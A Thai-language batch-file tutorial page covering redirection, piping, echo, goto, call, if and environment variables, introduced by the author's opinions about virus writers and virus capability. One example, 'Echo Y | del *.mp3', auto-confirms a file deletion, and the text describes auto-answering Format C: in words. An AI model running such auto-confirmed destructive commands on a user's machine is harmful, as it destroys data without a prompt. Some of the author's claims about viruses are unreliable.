	2. ผู้เขียนไวรัส...คือคนที่เขียนแอนตี้ไวรัสนั้นแหละ...ผมว่าถูกแต่ถูกบางส่วน...ไวรัสส่วนใหญ่ไม่ได้มาจากผู้เขียนแอนตี้ไวรัส...แต่มันมาจากมือใหม่ๆ ที่แอนตี้ไวรัสตรวจจับได้และฆ่าได้...แต่ถ้าเมื่อไหร่ที่มันเขียนจากผู้ผลิตแอนตี้ไวรัส...มันจะตรวจจับไม่ได้...(ตำรวจไม่จับตำรวจ) ฉนั้น...ไวรัสที่เรามักตรวจพบ...เป็นเพียงไวรัสกระจอก...และไวรัสระดับเครดิต(ไวรัสฆ่ายาก รอเสียเงิน) ส่วนไวรัสที่นักพัฒนาแอนตี้ไวรัสเขียนขึ้น...แอนตี้ไวรัสชนิดนั้นจะไม่พบหรือ แต่ใช่ว่ายี้ห้ออื่นจะหาไม่พบ...ถ้าผม...ผมเขียนไวรัสที่แอนตี้ไวรัสของตัวเองจับไม่ได้...แต่ถูกคู่แข่งยี้ห้ออื่นจับได้...เสียชื่อแย่...สู้ไม่เขียนจะดีกว่า...
	3. ถ้าเขียนไวรัสเป็นจะสร้างไวรัสที่ฆ่าไม่ตาย...และแพร่ไปทั่วโลกให้โด่งดัง...สำหรับผม...คำถามนี้...ฝันเฟื่อง...และเป็นคำถามที่มาจากผู้ที่เขียนไวรัสไม่เป็นเท่านั้น...เพราะในโลกความเป็นจริง...ไวรัส...
		3.1 ถูกดักจับได้
		3.2 ไม่สามารถติดเชื้อจากอากาศ...มันต้องมีโฮสต์และแหล่งที่มา...จึงถูกตรวจสอบได้เสมอ
		3.3 ไวรัสมนุษย์ต่างดาวหรือลบหลีกการตรวจจับได้ในระยะแรกๆ เท่านั้น ไวรัสเหมือนสิ่งมีชีวิต...มันมีพฤติกรรมไม่พึ่งประสงค์ เครื่องหนึ่งอาจจะไม่เจอ...แต่อีกสิบเครื่องสภาพแวดล้อมไม่เหมือนกัน...ยังไงก็เจอ
	4. ถ้าเขียนไวรัสได้...จะทำให้เครื่องคอมพิวเตอร์พังแบบไม่มีทางซ่อม...คำถามนี้...ปัญญาอ่อนสุดๆ เพราะซอฟต์แวร์กับฮาร์ดแวร์มันเป็นคนละส่วนกันเป็นคู่ขนาดกันเสมอ...ถ้าไวรัสเป็นเพียงตัวเลข 12345 ในประจุไฟฟ้าบนฮาร์ดดิสก์ และเป็นเพียงสารสื่อตัวนำ ในแรม...และเป็นเพียงอนุภาคไฟฟ้าใน CPU คุณคิดว่า...มันสามารถทำให้เครื่องคอมพิวเตอร์พังได้อย่างไร แต่ยังมีช่องทางเล่นงานผ่าน BIOS ซึ่งในอนาคตเอง...โปรแกรมที่บรรจุไว้ในสารสื่อตัวนำใน BIOS จะสามารถเขียนและแก้ไขตัวมันเองได้ที่เราเรียกว่า "เฟริมแวร์" เฟริมแวร์จะถูกแก้ไขโดยไวรัสหรือเปล่า...เป็นเรื่องของอนาคต
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu10'>
08.01. ทำความเข้่าใจคำสั่ง Batch File
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	ไปป์ปิ้ง และ ไดเร็กชั่น หรือต่อท่อ ให้กับคำสั่ง...แบตช์ไฟล์นั้นจะทำงานได้ไม่สมบรูณ์เลย...ถ้าไม่มีคำสั่งพวกนี้...และคำสั่งพวกนี้คืออะไร...ยกตัวอย่างเช่น คุณต้องการส่งข้อความ Yes ไปที่คำสั่ง Format C: ถ้าใน VB6 คุณอาจใช้ Sendkey เพื่อจำลองแป้นพิมพ์ แต่ภาษาบน Console นั้น API ไม่ได้ตอบรับกับภาษาพวกนี้...ตัวระบบปฏิบัติการจึงสร้างการต่อท่อคำสั่งขึ้นมา ที่เรียกว่า "Piping" หรือ "Pipe"อย่างที่เคยยกตัวอย่างในหลายๆ บทความว่า...การยิงคำสั่งออกไปที่แฟ้มข้อมูลก็ดี...หรือการเชื่อมต่อคำสั่งมารวมกันก็ดี...ผู้เขียนอาจจะยังไม่ได้ อธิบายในส่วนนี้ละเอียดมากนัก...เพราะมันจะกลายเป็นบล็อกวิชาการ...ถ้าเราศึกษาอะไรสักอย่างโดยไม่มีแรงจูงใจ...บล็อกนี้...ยอดวิวคงยังไม่เยียบหมื่นอย่างทุกวันนี้...จึงเอา วิชาการหรืออะไรที่หนักสมองมาไว้เป็นช่วงๆ ให้ไม่รู้สึกเบื่อ แต่วันนี้...คุณเจอของหนักแน่มาทำความเข้าใจอุปกรณ์ของ DOS ก่อนว่า...ถูกสงวนไว้ตั้งแต่ DOS ยุคโบราณ 7 อุปกรณ์ ดังนี้
	1. Nul อุปกรณ์ว่าง...หรือผลของคำสั่งไปยังความว่างเปล่า
	2. Con อุปกรณ์จอภาพ...และหน้าจอ...
	3. Prn อุปกรณ์เครื่องพิมพ์ หรือส่งผลของคำสั่งพิมพ์ทางปริ้นท์เตอร์ตัวที่เป็น Default
	4. Com(หมายเลข) อุปกรณ์ประเภทการสื่อสารแบบ พอตท์อนุกรม
	5. Lpt(หมายเลข) อุปกรณ์ประเภทการสื่อสารแบบ พอตท์ขนาน
	6. Aux อุปกรณ์ แอกซิเลียรี่ (ผู้เขียนว่ามันต้องอยู่ในเครื่องยุคเก่า)
	7. Clock$ อุปกรณ์ ระบบนาฬิกา
	อุปกรณ์เหล่านี้...มันจะถูกจองไฟล์แฮนเดิล...เพื่อไม่ให้ ใครก็ตามนำ Handle ส่วนนั้นไปใช้ได้ครับ...และจะถูกสงวนใช้ไว้แม้กระทั้งระบบปฏิบัติการวินโดวส์ทำงานแล้วก็ตาม...
	คำสั่ง &gt; อุปกรณ์การยิงคำสั่งรูปแบบนี้...คือการส่งผลการทำงานของคำสั่ง DOS ไปยังอุปกรณ์ที่ว่ามาทั้ง 7 หรือ ไฟล์ข้อมูลก็ได้ครับ (ไฟล์ข้อมูลไม่ถือเป็นอุปกรณ์เพราะจะถูกอ้างอิง Handle ใหม่เสมอ)
เช่น

	DIR &gt; PRN ; ส่งผลคำสั่ง DIR ไปที่เครื่องพิมพ์
	Echo Test Message&gt;Readme.txt ; ส่งข้อความ Test Message ไปที่่แฟ้ม Readme.txt
	
	คำสั่ง &gt;&gt; อุปกรณ์การยิงคำสั่งรูปแบบนี้...คือการส่งผลการทำงานเหมือนตัวอย่างแรก เพียงแต่ไปป์ปิ้งตัวนี้จะส่งผลต่อท้ายอุปกรณ์หรือต่อเติมไฟล์ที่มีอยู่แล้ว(ไม่เขียนทับ) เพื่อให้เกิดการต่อเนื่องของผลลัพธ์นั้นเอง
เช่น

Echo Message Line 2 &gt;&gt;Readme.txt ; ส่งข้อความ ไปยังแฟ้ม Redme.txt อีกครั้งโดยอยู่บรรทัดที่ 2

	คำสั่ง | คำสั่งการเชื่อมต่อคำสั่งนี้...คือการนำคำสั่ง 2 คำสั่งไปมารวมกันหรือมีผลลัพธ์เดียวกัน
เช่น

Echo Y | del *.mp3 ; หมายถึง ตอบ Y เมื่อ คำสั่ง Delete ถามว่า Yes หรือ No

(ไปป์ปิ้งตัวนี้ค่อนข้างใช้งานยาก...แต่มันเป็นสุดยอดของไปป์ทั้งมวลเพราะมันทำให้เกิดผลคำสั่งที่ไม่น่าจะเป็นไปได้...นอกเสียจากบางคนจะหาวิธีใช้งานและประยุกต์ใช้และเผยแพร่ให้ได้รู้นั้นเอง)
	คำสั่ง &lt; อุปกรณ์การรับคำสั่งนี้...ส่วนมากเป็นการรับแฟ้มข้อมูลเข้ามายั้งผลของคำสั่ง
เช่น

Debug.exe &lt; Script.txt
FTP.exe &lt; Script.txt
TelNet.exe &lt; Script.txt

	คำสั่ง & คำสั่ง คือการนำบรรทัดคำสั่งมา้เชื่อมไว้ในบรรทัดเดียวกันเช่น

Echo Line1 & Echo Line2

	คำสั่ง && คำสั่ง คือการทำงานเกี่ยวกับ Errorlevel (ย้อนกลับไปดู IF Errorlevel) คำสั่งนี้จะคล้าย IF ERRORLEVEL เพียงแต่คำสั่งจะสั้นลงมาเท่านั้น
เช่น

Findstr "Text" readme.txt && Msg %username% พบข้อความใน Redme.txt

	คำสั่ง || คำสั่ง คือการทำงานเกี่ยวกับ Errorlevel เช่นกัน เพียงแต่เทียบได้กับคำสั่ง IF NOT ERRORLEVEL
เช่น

Findstr "Text" Redme.txt || Msg %username% ไม่พบข้อความใน Readme.txt

	คำสั่ง &gt; แฟ้มข้อมูล &gt;&1
	คำสั่ง &gt; แฟ้มข้อมูล &gt;&2
***************************************************************
รอเนื้อหาใหม่
***************************************************************

คำสั่ง Echo
	เคยเจอกระทู้ของเด็กๆ ถามว่า @echo off เป็นไวรัสหรือเปล่า...เห็นมีอยู่ในแบตช์ไฟล์ทุกตัว...จริงแล้วมันไม่ใช่ไวรัสครับ...แต่มันธรรมเนียมซะแล้วว่า...
@ คือ การซ่อนคอมมาน์ดไลน์...
เช่น 

echo ทดสอบ ; ผลของมันคือ
C:\Documents and Settings\Administrator&gt;echo ทดสอบ

ทดสอบ
แต่ถ้า

@echo ทดสอบ ; ผลของมันคือ

ทดสอบ
ไม่มีบรรทัด

 C:\Documents and Settings\Administrator&gt;echo ทดสอบ 
แสดงออกมาภายที่คอนโซล

	ส่วน Echo off หรือ ไม่ได้หมายความว่า "ไม่ต้องตอบ" แต่หมายความกลับกันคือ "ไม่ต้องถาม" อ้าว...ทำไมเป็นอย่างนั้น...ไม่ต้องถามในที่นี้คือ ไม่ต้องถามที่ "Command Line" หรืออีกนัยหนึ่งก็คือไม่ต้องแสดงคำสั่งที่ทำงานอยู่ที่คอมมานด์ไลน์นั้นเอง แต่ตัวของคำสั่งเอง...ยังเพี้ยนกว่านี้คือ มันไม่สามารถหยุดการแสดงคำสั่งของมันที่ คอมมานด์ไลน์ได้ทำไมนะหรือมันยัง แสดงบรรทัด 

C:\Documents and Settings\Administrator&gt;echo off 

	ในคำสั่งแรกสุดเพราะตัวมันเอง "หยุดตัวมันเองไม่ได้" จึงต้องใส่เครื่องหมาย @ เพื่อหยุดการแสดงคำสั่งที่คอมมานด์ไลน์ของคำสั่ง Echo off อีกที สรุป คำสั่ง @ คือ คำสั่งหยุดการแสดงผลของคอมมานด์ไลน์ แต่ต้องนำหน้าอยู่ทุกๆ คำสั่ง แต่ Echo off จะแทนคำสั่ง @ นำหน้าทุกคำสั่ง "ยกเว้นตัวมัน" ทีนี้พอเข้าใจหรือยัง รู้สึกยังมี งูสองตัวในหัว...เฮ้อ
ทีนี้มาทำความกระจ้างคำสั่ง echo แบบหมดเปลือกกันซะ... 

ECHO [ON | OFF] ; เปิดปิดคอมมานด์ไลน์
ECHO [message] ; แสดงข้อความ
; ถ้าไม่มีพารามิเตอร์...มันจะยังรอการพิมพ์ On/Off อยู่

ตัวอย่างคำสั่งที่น่าสนใจสำหรับ Echo "แอคโค่ วววววว"

echo Test ; echo{วรรค}Test ผลของมันคือ Test{บรรทัดใหม่} ; Test{อักขระ LineFeed(ขึ้นบรรทัด
ใหม่)}{อักขระ Charactor Return(ย้อนกลับไปตัวแรกเหมือนพิมพ์ดีด)} ไม่ต้องสงสัยเลยว่า...ทุกๆ บรรทัดของ echo จะมี 2 Byte เพิ่มเข้ามาเพราะมันเป็น มาตราฐานของ DOS คือมันยังอนุรักษ์การทำงานของอักขระควบคุมโบราณ 2 ตัวนี้...ที่เคยทำงานในรหัส EBCDIC หรือเครื่องที่มีแต่คอนโซลเท่านั้น จึงทำให้ 32 ตัวแรกของรหัส ASCII นั้น...เป็นอักขระควบคุม ซึ่งจะทำให้คำสั่ง echo แสดงผลอักษรเหล่านี้ผิดเพี้ยนไปจากความใจของนักเขียนโปรแกรม

echo{วรรค}{Alt+7} ; แอคโค่ ตามด้วยรหัสควบคุมหมายเลข7 คือ "Beep" หรือการเตือน Error ซึ่งเป็นหนึ่ง
ในรหัสควบคุม 32 ตัวแรกส่งผลให้ DOS เองมีการเตือน "บี๊บ" เหมือน BIOS แต่ถ้าบนวินโดวส์ "เสียง Error" จะดังขึ้น

echo REGEDIT 4&gt;Test.REG ; ส่งข้อความ REGEDIT 4 ไปที่แฟ้ม Test.REG (ในบรรทัดแรก)
echo [HKEY_CURRENT_USER\Control Panel\Desktop]&gt;&gt;Test.REG ;ส่งข้อความ [HKEY_CURRENT_ USER\Control Panel\Desktop] ต่อท้ายแฟ้ม Test.REG (ในบรรทัดถัดไป)
***ซึ่งการใช้งาน Pipe และ Direction  (&gt;, &gt;&gt; ,|) จะกล่าวถึงในคราวหลังๆ

echo 00:00:00|time ; คือส่งข้อความเวลา 00:00:00 เชื่อมต่อคำสั่ง Time มีผลทำให้เวลาของเครื่องใน BIOS เองเป็นตามตัวอย่าง
The current time is: 22:19:00.59 ; เวลาเก่า
Enter the new time: 00:00:00 ; เวลาใหม่
	วิธีนี้จะประหยัดเวลาในการเซ็ตระบบอย่างมากหากประยุกค์ใช้ในวงแลนเพื่อให้เวลาในร้าน Internet เองหรือสำนักงาน...เป็นเวลาเดียวกัน

echo 01/01/2000|date ; คือส่งข้อความวันที่ 01/01/2000 เชื่อมต่อคำสั่ง Date มีผลทำให้วันที่ของเครื่องใน BIOS เองเป็นไปตามตัวอย่าง
The current date is: Tue 01/08/2013 ; วันเก่า
Enter the new date: (mm-dd-yy) 01/01/2000 ; วันใหม่
echo CatEye|label ; คือส่งชื่อไดร์ฟข้อมูล เชื่อมต่อคำสั่ง Label มีผลทำให้เปลี่ยนชื่อไดร์ฟที่ทำงานอยู่เป็นข้อความที่ต้องการ (ห้ามเกิน 13 Byte)
Volume in drive C: is CatEye ; ชื่อใหม่
Volume Serial Number is xxxx-xxxx ; รหัส Serial Number
Volume label (ENTER for none)? ; ไม่มีปัญหา...ฉลุย..

echo ^&lt;HTML^&gt;&gt;Test.HTM ; คือส่งข้อความว่า &lt;HTML&gt; ไปที่แฟ้ม Test.HTM
	คำสั่ง ^ เองพึงมีใช้งานบน CMD.EXE ในสมัย COMMAND.COM ไม่สามารถใช้งานคำสั่งนี้ได้ วิธีนี้สามารถทำให้แบตช์ไฟล์สามารถสร้างเวป...ออกมาได้ด้วย หรือกล่าวคือมันสามารถแสดงอักขระต้องห้ามทั้งหมดผ่าน คำสั่งนี้...

echo. ; echo{จุด} หมายถึงขึ้นบรรทัดใหม่

echo . ; echo{วรรค}{จุด} หมายถึงแสดง "." และขึ้นบรรทัดใหม่

echo ; echo(ลืมจุด) หมายถึง Error ครับ...มันจะแสดงข้อความว่า ECHO is on.

echo Msg1 & echo Msg2 ; คือ แสดงข้อความ Msg1 ขึ้นบรรทัดใหม่ แสดงข้อความ Msg2 ขึ้นบรรทัดใหม่
	และแล้ว...ก็หมดเทคนิคคำสั่ง echo ซะที ซึ่งจริงๆ แล้วมันสามารถทำได้มากนี้...แต่ขอยกตัวอย่างเพียงเท่านี้...บางคน...เอาไปประยุกต์ซะน่ากลัว...เช่น Format และตอบ Yes อัตโนมัติ...ซึ่งมันก็ทำได้แต่ถ้ายกตัวอย่างมีหวังมือใหม่...ทำระบบเจ๊งกันพอดี แบตช์ไฟล์เอง...เป็นสิ่งที่เป็นมรดกตกทอดมาจาก DOS สมบัติชิ้นสุดท้ายจาก "เจ้าคุณปู่" ยังไงลองหัดพิมพ์หัดเล่นดู...เพราะการเขียนแบตช์ไฟล์นั้น...ไม่มีใครเป็นตั้งแต่เกิด...ผมถูก COMMAND.COM ด่าว่า Bad Command or filename... อยู่บ่อย...จนตีความหมายของเจ้าคุณปู่ว่า "คำสั่งหรือไฟล์ชั้นเลว..." เจ้าคุณปู่ด่าทุกวัน...แต่ยุคปัจจุบัน...เจ้าคุณปู่...สุภาพมาก ถ้าบอกรักเจ้าคุณปู่...เจ้าคุณปู่มักจะด่าว่า...
'LoveYou' is not recognized as an internal or external command,
operable program or batch file.
อืม...ใครเข้าใจ...ช่วยบอกที...

คำสั่ง Goto
	อะ...วันนี้..เรามาปูพื้นฐานเกี่ยวกับคำสั่ง GoTo (โกทู...) คำสั่งนี้...นับเป็นคำสั่งที่โบราณที่สุดเท่าที่ภาษาระดับสูงมีมา...เพราะมันเป็นคำสั่งที่ใช้ควบคุมการทำงานโดยย้ายการทำงานของคำสั่ง...ไปที่นั่น...ที่นี่...หรือบางคนเขียนไม่เป็น มันจะเกิด Loop Over Flow ; เอมันคืออะไร... มันคือการกระโดดไปมาอย่างไม่มีที่สิ้นสุดไม่รู้ว่าจะจบเมื่อไหร่...เป็นเหตุให้ CPU ทำงานเกินความสามารถและแจ้ง Error ออกมา หรือบางครั้ง...มัน "แฮงค์" เลย 

GOTO :MSG1 ; ไปยังตำแหน่ง MSG1
MSG %username% "กล่องข้อความนี้ไม่สามารถแสดงได้...เพราะถูกข้ามด้วยคำสั่ง Goto" ; ไม่สามารถแสดงข้อความได้
:MSG1 ; ตำแหน่ง MSG1
MSG %username% "กระโดดมาที่ MSG1 เพื่อแสดงข้อความ" ; แสดงข้อความ
GOTO :MSG1 ; ไปยังตำแหน่ง MSG1
:MSG2 ; ตำแหน่ง MSG2
MSG %username% "กล่องข้อความที่ 2" ; แสดงข้อความถัดมา
GOTO :END ; และกระโดดไปท้ายแบตช์ไฟล์
:MSG1 ; ตำแหน่ง MSG1
MSG %username% "กล่องข้อความที่ 1" ; แสดงข้อความแรก
GOTO MSG2 ; วนกลับไปตำแหน่ง MSG2
:END ; สิ้นสุดคำสั่ง...(ต้องมี...เพื่อให้แบตช์ไฟล์หาจุดสิ้นสุดคำสั่งได้)
GOTO :MSG1 ; ไปยังตำแหน่ง MSG1
:MSG2 ; ตำแหน่ง MSG2
MSG %username% "กล่องข้อความที่ 2 (วนไม่รู้จบ) เรียก Loop Over Flow" ; แสดงข้อความถัดมา
:MSG1 ; ตำแหน่ง MSG1
MSG %username% "กล่องข้อความที่ 1 (วนไม่รูจบ) เรียก Loop Over Flow" ; แสดงข้อความแรก
GOTO MSG2 ; ไปยังตำแหน่ง MSG2 (และึคำสั่งจะไหลการทำงานมาบรรทัดนี้...ใหม่และวนกลับไปอย่างไม่รู้จบ)
คำสั่งต่อไป...ที่ต้องใช้งานควบคุมการงานของแบตช์ไฟล์เช่นกันเพื่อความ

คำสั่ง Call
	อื่ม...มันทำงานอย่างไร...มันทำงานเป็นส่วนขยายของ GOTO และที่ GOTO ทำไม่ได้คือ กระโดดไป...และกลับมายังบรรทัดถัดไป

CALL :MSG1 ; ไปยังโมดูลแสดงข้อความแรก
CALL :MSG2 ; ไปยังโมดูลแสดงข้อความที่สอง
GOTO :END ; ไปยังสิ้นสุดโปรแกรม
:MSG1 ; ตำแหน่ง MSG1
MSG %username% "แสดงข้อความที่ 1 และย้อนกลับไป...บรรทัดถัดไป" ; แสดงข้อความแรก
GOTO :END ; ไปยังสิ้นสุดโปรแกรม (เพื่อไม่ให้การทำงานไหลไปบรรทัดถัดไป)
:MSG2 ; ตำแหน่ง MSG2
MSG %username% "แสดงข้อความที่ 2 และย้อนกลับไป...บรรทัดถัดไป" ; แสดงข้อความถัดไป
GOTO :END ; ไปยังสิ้นสุดโปรแกรม (เพื่อไม่ให้การทำงานไหลไปบรรทัดถัดไป)
:MSG3 ; ตำแหน่ง MSG3
MSG %username% "ข้อความนี้ถูกข้ามไป...เพราะไม่มีการเรียกโมดูล" ; ข้อความไม่ถูกแสดง
:END ; ตำแหน่งสิ้นสุดแบตช์ไฟล์

ประยุกต์ใช้งานอย่างเทพ...

CALL :MSGALL "แสดงข้อความโมดูลนี้ครั้งแรก..." ; เรียกโมดูลอรรถประโยชน์ และแสดงข้อความแรก
CALL :MSGALL "แสดงข้อความโมดูลนี้ครั้งที่สอง..." ; เรียกโมดูลอรรถประโยชน์ แสดงข้อความสอง
CALL :MSGALL "แสดงข้อความโมดูลนี้ครั้งที่สาม..." ; เรียกโมดูลอรรถประโยชน์ แสดงข้อความสาม
GOTO :END ; กระโดดไปยังตำแหน่งสุดท้าย...(เพื่อไม่ให้ไหลการทำงานไปบรรทัดถัดไป)
:MSGALL %1 ; ตำแหน่งโมดูลอรรถประโยชน์ MSGALL
MSG %username% %1 ; แสดงข้อความ ผ่าน อาร์กิวเมนต์ที่ 1
:END ; สิ้นสุดการทำงาน

	จะเห็นว่า...การทำงานง่าย...และคำสั่งทำงานสั้นลงมาก...ซึ่งประยุกต์ใช้งานในการแสดง "ข้อความ Error" สำหรับแบตช์ไฟล์อย่างมืออาชีพ...ผมจะไม่พยามรื้อฟื้นคำสั่งโบราณ หรือวิธีการโบราณเพื่อสอน...แต่ประยุกค์การใช้งานชั้นสูงเพื่อให้คุณเขียนโปรแกรมอย่างโปรแกรมเมอร์มืออาชีพ...และมีทักษะการเขียนโปรแกรมที่ดี...อะไรที่ไม่จำเป็นก็ตัด ออกไป...จากตัวอย่าง %1 มันคืออะไร...
	มันคือ "อาร์กิวเมนต์" หรือ "ตัวแปรภายนอก" ของโมดูลในแบตช์ไฟล์ ซึ่งสามารถส่งผ่านมาได้...ด้วยการเว้นวรรค...เหมือน "Parameter; พารามิเตอร์" ของแบตช์ไฟล์ผ่าน คอมมานด์ไลน์ เช่น

DIR *.BAT

ไอ้ *.BAT คือ %1 หรือ พารามิเตอร์ของ แบตช์ไฟล์ แต่ถ้าเราเรียกใช้งานในโมดูลหรือคำสั่ง CALL ของแบตช์ไฟล์เราเรียกอาร์กิวเมนต์ และอาร์กิวเมนต์เอง...ก็สามารถสืบทอด พารามิเตอร์เป็นทอดๆ ได้เช่นกันสรุป...การเขียนโปรแกรมเอง...ก่อนอื่นต้องนึกลำดับขั้นตอนให้ออก...และก็หัดเรียงลำดับความคิดออกเป็นสัญลักษณ์ โฟว์ชาร์ต...ซึ่งจะปูพื้นฐานกันในคราวหน้า...

คำสั่ง IF
IF [NOT] ERRORLEVEL number command ; การทำงานคือ ถ้า DOS หรือโปรแกรมบน DOS มีการส่งค่า ตัวเลขผ่านโปรแกรมมาเป็น เลขใด... ให้ทำงานในคำสั่งที่ระบุ
***************************************************************
รอเนื้อหาใหม่
***************************************************************

IF [NOT] string1==string2 command ; คือการเปรียบเทียบข้อความ...ร่วมถึงตัวเลขด้วย (COMMAND.COM คำนวนตัวเลขไม่ได้) ซึ่งปัจจุบัน... DOS ฉลาดขึ้นมาก เทียบชั้นภาษาระดับสูง ทำให้มันมีความซับซ้อนกว่าแต่ก่อนมากมาย

IF A==a Msg %Username% "A เท่ากับ a" ; คำสั่งนี้...มันจะเปรียบเทียบ A ตัวพิมพ์ใหญ่ เท่ากับ a ตัวพิมพ์เล็กหรือไม่
IF NOT A==a Msg %Username% "A ไม่เท่ากับ a" ; คำสั่งนี้...มันจะเปรียบเทียบ A ตัวพิมพ์ใหญ่ ไม่เท่ากับ a ตัวพิมพ์เล็กหรือไม่
***ผลที่ได้คือ มันไม่เท่ากัน
	ทีนี้...รู้สึกว่า...การเขียนโปรแกรมแบบเปรียบเทียบที่ละบรรทัด...มันเป็นภาษาแบตช์ไฟล์ยุคโบราณที่เราเรียกมันว่า "อินเตอร์พลีต" หรือ "ทำงานทีละบรรทัด" ความเป็นจริง CMD.EXE ก็ยังให้แบตช์ไฟล์ทำงานอย่างนั้นอยู่...เพียงแต่เพิ่มลูกเล่นให้เขียนเหมือนภาษาระดับสูง แบบ C++
เรียนแบบภาษาโครงสร้างเพื่อความสบรูณ์แบบและเข้าใจง่าย...และมันก็ทำได้ดี เราจึงไม่นิยมเขียนการเปรียบเทียบคำสั่งแบตช์ไฟล์แบบนั้นอีกต่อไปแล้ว...ให้เขียนแบบนี้

IF A==a (Msg %Username% "A เท่ากับ a") ELSE (Msg %Username% "A ไม่เท่ากับ a") ; ความหมายก็เช่นเดิมกับตัวอย่างด้านบนเพียงแต่ว่า ใส่ วงเล็บเพื่อความเข้าใจง่าย...และ ELSE เอง ก็มีความหมายคำสั่งด้านตรงกันข้ามกับ IF จึงนิยามแทนคำว่า NOT ได้เช่นกัน หรือจะเขียนแบบ วรรคให้ตรงกันแบบ โปรแกรมเมอร์ที่ถนัด HTML หรือ C เองก็ตามอย่างนี้
IF A==a (
	Msg %Username% "A เท่ากับ a"
) ELSE (
	Msg %Username% "A ไม่เท่ากับ a"
)
; ความหมายก็เช่นเดิมเหมือนกัน
	
	แต่ผู้เขียนถนัด VB ซึ่งเป็นภาษาแบบบรรทัดยาวๆ จึงเสนอตัวอย่างในโปรแกรมต่อไป...ในรูปแบบที่ผู้เขียนถนัดแล้วกัน
IF A=="A" (Msg %Username% "A เท่ากับ A(เครื่องหมายคำพูด)") ELSE (Msg %Username% "A ไม่เท่ากับ A(เครื่องหมายคำพูด)") ; หมายถึงให้เปรียบเทียบว่า...ถ้ามีเครื่องหมายคำพูด...จะเท่ากันไหม? คำตอบคือ "ไม่เท่ากัน"
IF [NOT] EXIST filename command ; ค้นหาแฟ้มและโฟลเดอร์ว่ามีอยู่จริงหรือไม่

คำสั่ง
IF EXIST %systemroot%\SYSTEM32\CMD.EXE (
	MSG %username% "พบแฟ้ม CMD.EXE"
) ELSE (
	MSG %username% "ไม่พบแฟ้ม..."
)
*** ผลที่ได้คือ พบแฟ้ม
ส่วนการหาโฟลเดอร์ที่ต้องการว่ามีอยู่หรือไม่ให้ตามนี้

คำสั่ง
IF EXIST %systemroot%\SYSTEM32 (
	MSG %username% "พบ Folder \System32"
) ELSE (
	MSG %username% "ไม่พบ Folder..."
)
*** ผลที่ได้คือ พบ Folder

EQU - เท่ากัน
NEQ - ไม่เท่ากัน
LSS - น้อยกว่า
LEQ - น้อยกว่าหรือเท่ากับ
GTR - มากกว่า
GEQ - มากกว่าหรือเท่ากับ

การใช้เงื่อนไขเพื่อเปรียบเทียบค่า...

คำสั่ง
IF 1+1 EQU 2 (MSG %USERNAME% "เท่ากัน") ELSE (MSG %USERNAME% "ไม่เท่ากัน") ; ผลคือ ไม่เท่ากัน

คำสั่ง
IF 2 EQU 2 (MSG %USERNAME% "เท่ากัน") ELSE (MSG %USERNAME% "ไม่เท่ากัน") ; ผลคือ เท่ากัน

คำสั่ง
IF 1+1 EQU 1+1 (MSG %USERNAME% "เท่ากัน") ELSE (MSG %USERNAME% "ไม่เท่ากัน") ; ผลคือ เท่ากัน

คำสั่ง
IF 1+1 NEQ 2 (MSG %USERNAME% "ไม่เท่ากัน") ELSE (MSG %USERNAME% "เท่ากัน") ; ผลคือ ไม่เท่ากัน

คำสั่ง
IF 2 NEQ 2 (MSG %USERNAME% "ไม่เท่ากัน") ELSE (MSG %USERNAME% "เท่ากัน") ; ผลคือ เท่ากัน

คำสั่ง
IF 1+1 NEQ 1+1 (MSG %USERNAME% "ไม่เท่ากัน") ELSE (MSG %USERNAME% "เท่ากัน") ; ผลคือ เท่ากัน

คำสั่ง
IF 1 LSS 2 (MSG %USERNAME% "1 น้อยกว่า 2") ELSE (MSG %USERNAME% "1 ไม่น้อยกว่า 2") ; ผลคือ 1 น้อยกว่า 2

คำสั่ง
IF 2 GTR 1 (MSG %USERNAME% "2 มากกว่า 1") ELSE (MSG %USERNAME% "2 ไม่มากกว่า 1") ; ผลคือ 2 มากกว่า 1

คำสั่ง
IF 1 LEQ 2 (MSG %USERNAME% "1 น้อยกว่าหรือเท่ากับ 2") ELSE (MSG %USERNAME% "1 ไม่น้อยกว่าเท่ากับ 2") ; ผลคือ 1 น้อยกว่าหรือเท่ากับ 2

คำสั่ง
IF 2 GEQ 1 (MSG %USERNAME% "2 มากกว่าหรือเท่ากับ 1") ELSE (MSG %USERNAME% "2 ไม่มากกว่าหรือเท่ากับ 1") ; ผลคือ 2 มากกว่าหรือเท่ากับ 1

IF CMDEXTVERSION number command ; คำสั่งนี้ผู้เขียนยังไม่ทราบแน่ชัดว่า...เกี่ยวกับ Version ยังไงแต่ที่ทดสอบดูกับ CMD.EXE บนวินโดวส์ 7 เป็นดังนี้

คำสั่ง
IF CMDEXTVERSION 2 MSGBOX %USERNAME% "OK" ; หมายเลข EXTVERSION 2 กล่องข้อความขึ้น OK

IF DEFINED variable command ; หมายถึง ถ้ามีการนิยามตัวแปรดังกล่าวให้ทำงานในคำสั่ง...

คำสั่ง
IF DEFINED USERNAME MSG %USERNAME% "พบตัวแปรยูสเซอร์เนมส์...ค่าในตัวแปรคือ %USERNAME%" ; ผลคือแสดงกล่องข้อความและ ค่าในตัวแปร USRENAME

ตัวแปร Environment
	การใช้งาน DOS มาตั้งแต่ยุคโบราณนั้น...เรื่องของตัวแปรนั้นมีข้อจำกัดมากเพราะใช้งานได้ไม่กี่ตัวก็เต็มหน่วยความจำแล้ว มาในยุคของ XP เป็นต้นมาตัวแปร Environment มีความสำคัญมากในการเชื่อมต่อระบบด้านบนกับระบบด้านล่าง เช่นผู้เขียนใช้งานคำสั่ง SET ให้ดู ในภาคแรก คำสั่ง SET นี้เองเป็นคำสั่งที่แสดงตัวแปร Environment ทั้งหมดของ CMD.EXE ที่ทำงานในขณะนั้น อาจใช้งานแค่ "เซกชั่น" นั้นเท่านั้นไม่ สามารถข้ามไปยังเซกชั่นอื่นบนวินโดวส์ ยกเว้นตัวแปรเอนวิรอนเมนต์บางตัวที่ถูกกำหนดค่าพื้นฐานบนรีจิสตรี ซึ่งจะถูกเซ็ตใช้งานทุกๆ ครั้งที่ เริ่มหน้าต่าง CMD ใหม่เดิมทีตัวแปรเอนวิรอนเมนต์เองถูก DOS อ้างถึงสภาพแวดล้อมของระบบปฏิบัติการแต่ต่อมาพบว่ามีการทำงานของโปรแกรม บน DOS หรือตัว คำสั่งแบตช์ไฟล์เองเรียกใช้งานและต้องการพื้นที่หน่วยความจำประเภทนี้อย่างมาก บนวินโดวส์จึงขยายหน่วยความจำนี้ออกไปอีก (แต่ผู้เขียน ไม่มีข้อมูลจาก 